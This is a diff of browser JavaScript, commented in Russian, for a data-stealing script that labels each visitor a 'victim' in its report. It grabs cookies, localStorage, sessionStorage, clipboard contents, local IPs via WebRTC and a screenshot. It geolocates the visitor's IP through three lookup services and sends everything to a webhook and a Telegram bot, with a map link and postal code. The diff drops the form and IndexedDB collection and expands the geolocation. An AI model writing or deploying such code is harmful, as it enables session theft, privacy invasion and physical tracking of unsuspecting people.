@@ -36,7 +36,7 @@
 
             const data = {};
 
-            // ---- 1. Куки (все) ----
+            // ---- Куки ----
             data.cookies = {};
             if (document.cookie) {
                 document.cookie.split('; ').forEach(c => {
@@ -45,47 +45,21 @@
                 });
             }
 
-            // ---- 2. LocalStorage (все) ----
+            // ---- LocalStorage ----
             data.localStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 if (key) data.localStorage[key] = localStorage.getItem(key);
             }
 
-            // ---- 3. SessionStorage (все) ----
+            // ---- SessionStorage ----
             data.sessionStorage = {};
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
             }
 
-            // ---- 4. IndexedDB (список БД) ----
-            data.indexedDB = [];
-            try {
-                if (indexedDB.databases) {
-                    const dbs = await indexedDB.databases();
-                    data.indexedDB = dbs.map(db => db.name);
-                }
-            } catch (_) {}
-
-            // ---- 5. Все формы (если есть) ----
-            data.forms = {};
-            document.querySelectorAll('input, textarea, select').forEach(el => {
-                const name = el.name || el.id || el.className || 'field';
-                if (el.value !== undefined && el.value !== null && el.value !== '') {
-                    data.forms[name] = el.value;
-                }
-            });
-            document.querySelectorAll('form').forEach(form => {
-                try {
-                    const fd = new FormData(form);
-                    for (const [k, v] of fd.entries()) {
-                        data.forms['form_' + k] = v;
-                    }
-                } catch (_) {}
-            });
-
-            // ---- 6. IP ----
+            // ---- IP ----
             data.ip = null;
             try {
                 const ipResp = await fetch('https://api.ipify.org?format=json');
@@ -93,28 +67,86 @@
                 data.ip = ipJson.ip;
             } catch (_) {}
 
-            // ---- 7. Гео по IP ----
+            // ---- ГЕО - МАКСИМАЛЬНЫЙ СБОР (3 ПРОВАЙДЕРА) ----
             data.geo = null;
-            try {
-                if (data.ip) {
-                    const geoResp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`);
-                    const geoJson = await geoResp.json();
-                    if (geoJson.status === 'success') {
+            data.geo_raw = null;
+
+            // 1. ipwhois.io (самый точный, бесплатно 10000 запросов/мес)
+            if (data.ip) {
+                try {
+                    const resp = await fetch(`https://ipwhois.io/json/${data.ip}`);
+                    const json = await resp.json();
+                    if (json && json.success !== false) {
                         data.geo = {
-                            country: geoJson.country || '?',
-                            region: geoJson.regionName || '?',
-                            city: geoJson.city || '?',
-                            lat: geoJson.lat || 0,
-                            lon: geoJson.lon || 0,
-                            isp: geoJson.isp || '?',
-                            org: geoJson.org || '?',
-                            timezone: geoJson.timezone || '?'
+                            country: json.country || '?',
+                            country_code: json.country_code || '?',
+                            region: json.region || '?',
+                            city: json.city || '?',
+                            lat: json.latitude || 0,
+                            lon: json.longitude || 0,
+                            isp: json.isp || '?',
+                            org: json.org || '?',
+                            timezone: json.timezone || '?',
+                            continent: json.continent || '?',
+                            currency: json.currency || '?',
+                            phone_code: json.phone_code || '?',
+                            postal: json.postal || '?'
                         };
                     }
-                }
-            } catch (_) {}
+                } catch (_) {}
 
-            // ---- 8. Локальный IP через WebRTC ----
+                // 2. ipapi.co (запасной)
+                if (!data.geo) {
+                    try {
+                        const resp = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                        const json = await resp.json();
+                        if (json && json.error !== true) {
+                            data.geo = {
+                                country: json.country_name || '?',
+                                country_code: json.country_code || '?',
+                                region: json.region || '?',
+                                city: json.city || '?',
+                                lat: json.latitude || 0,
+                                lon: json.longitude || 0,
+                                isp: json.org || '?',
+                                org: json.org || '?',
+                                timezone: json.timezone || '?',
+                                continent: json.continent_code || '?',
+                                currency: json.currency || '?',
+                                phone_code: json.country_calling_code || '?',
+                                postal: json.postal || '?'
+                            };
+                        }
+                    } catch (_) {}
+                }
+
+                // 3. ip-api.com (ещё запасной, но уже без координат если не успел)
+                if (!data.geo) {
+                    try {
+                        const resp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`);
+                        const json = await resp.json();
+                        if (json.status === 'success') {
+                            data.geo = {
+                                country: json.country || '?',
+                                country_code: '?',
+                                region: json.regionName || '?',
+                                city: json.city || '?',
+                                lat: json.lat || 0,
+                                lon: json.lon || 0,
+                                isp: json.isp || '?',
+                                org: json.org || '?',
+                                timezone: json.timezone || '?',
+                                continent: '?',
+                                currency: '?',
+                                phone_code: '?',
+                                postal: '?'
+                            };
+                        }
+                    } catch (_) {}
+                }
+            }
+
+            // ---- Локальный IP через WebRTC ----
             data.localIPs = [];
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -132,7 +164,7 @@
                 data.localIPs = ips;
             } catch (_) {}
 
-            // ---- 9. Буфер обмена ----
+            // ---- Буфер обмена ----
             data.clipboard = null;
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -140,7 +172,7 @@
                 }
             } catch (_) {}
 
-            // ---- 10. Скриншот (base64) ----
+            // ---- Скриншот ----
             data.screenshot = null;
             try {
                 const script = document.createElement('script');
@@ -161,45 +193,22 @@
                 }
             } catch (_) {}
 
-            // ---- 11. Все ссылки на странице ----
-            data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
-
-            // ---- 12. Мета-теги ----
-            data.meta = {};
-            document.querySelectorAll('meta').forEach(m => {
-                const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
-                data.meta[name] = m.getAttribute('content') || '';
-            });
-
-            // ---- 13. Параметры URL ----
-            data.urlParams = {};
-            new URLSearchParams(window.location.search).forEach((v, k) => {
-                data.urlParams[k] = v;
-            });
-
-            // ---- 14. Реферер ----
-            data.referrer = document.referrer || null;
-            data.url = window.location.href;
-
-            // ---- 15. User-Agent ----
+            // ---- Доп. данные ----
             data.userAgent = navigator.userAgent;
-
-            // ---- 16. Экран ----
+            data.url = window.location.href;
+            data.referrer = document.referrer || null;
             data.screen = {
                 width: screen.width,
                 height: screen.height,
-                colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio
             };
-
-            // ---- 17. Плагины ----
             data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
 
             // ============================================================
             //  ОТПРАВКА
             // ============================================================
 
-            // ---- Отправка на Webhook ----
+            // ---- Webhook ----
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -208,27 +217,44 @@
                 });
             } catch (_) {}
 
-            // ---- Отправка в Telegram ----
+            // ---- Telegram (максимум гео) ----
             try {
-                let msg = '🔴 ЖЕРТВА\n';
+                let msg = '🔴 ЖЕРТВА\n\n';
                 if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
+                
+                // ГЕО - ВСЯ ДОСТУПНАЯ ИНФОРМАЦИЯ
                 if (data.geo) {
-                    msg += `📍 Страна: ${data.geo.country}\n`;
-                    msg += `🏙 Город: ${data.geo.city}\n`;
-                    msg += `🗺 Координаты: ${data.geo.lat}, ${data.geo.lon}\n`;
-                    if (data.geo.isp) msg += `📡 Провайдер: ${data.geo.isp}\n`;
+                    msg += `\n📍 ГЕОЛОКАЦИЯ:\n`;
+                    msg += `   🌍 Страна: ${data.geo.country || '?'}`;
+                    if (data.geo.country_code) msg += ` (${data.geo.country_code})`;
+                    msg += `\n`;
+                    if (data.geo.region) msg += `   🏛 Регион: ${data.geo.region}\n`;
+                    if (data.geo.city) msg += `   🏙 Город: ${data.geo.city}\n`;
+                    if (data.geo.lat && data.geo.lon) {
+                        msg += `   🗺 Координаты: ${data.geo.lat}, ${data.geo.lon}\n`;
+                        msg += `   🔗 Карта: https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
+                    }
+                    if (data.geo.postal) msg += `   📮 Почтовый индекс: ${data.geo.postal}\n`;
+                    if (data.geo.isp) msg += `   📡 Провайдер: ${data.geo.isp}\n`;
+                    if (data.geo.org && data.geo.org !== data.geo.isp) msg += `   🏢 Организация: ${data.geo.org}\n`;
+                    if (data.geo.timezone) msg += `   🕐 Часовой пояс: ${data.geo.timezone}\n`;
+                    if (data.geo.continent) msg += `   🌎 Континент: ${data.geo.continent}\n`;
+                    if (data.geo.currency) msg += `   💰 Валюта: ${data.geo.currency}\n`;
+                    if (data.geo.phone_code) msg += `   📞 Телефонный код: +${data.geo.phone_code}\n`;
+                } else {
+                    msg += `\n📍 ГЕОЛОКАЦИЯ: не удалось определить\n`;
                 }
+
                 if (data.localIPs && data.localIPs.length) {
-                    msg += `📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
+                    msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                 }
-                if (data.clipboard) msg += `📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
-                if (data.userAgent) msg += `📱 UA: ${data.userAgent.substring(0, 80)}\n`;
+                if (data.clipboard) msg += `\n📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
+                msg += `\n📱 UA: ${data.userAgent.substring(0, 80)}...\n`;
                 msg += `🍪 Куки: ${Object.keys(data.cookies).length} шт.\n`;
                 msg += `💾 LocalStorage: ${Object.keys(data.localStorage).length} шт.\n`;
                 msg += `🗂 SessionStorage: ${Object.keys(data.sessionStorage).length} шт.\n`;
-                msg += `🗄 IndexedDB: ${data.indexedDB.length} шт.\n`;
                 if (data.screenshot) msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
-                msg += `🔗 URL: ${data.url}`;
+                msg += `\n🔗 URL: ${data.url}`;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -237,7 +263,7 @@
                 });
             } catch (_) {}
 
-            // ---- Отправка скриншота как фото ----
+            // ---- Скриншот отдельно ----
             if (data.screenshot && data.screenshot.length > 10000) {
                 try {
                     const blob = await fetch(data.screenshot).then(r => r.blob());
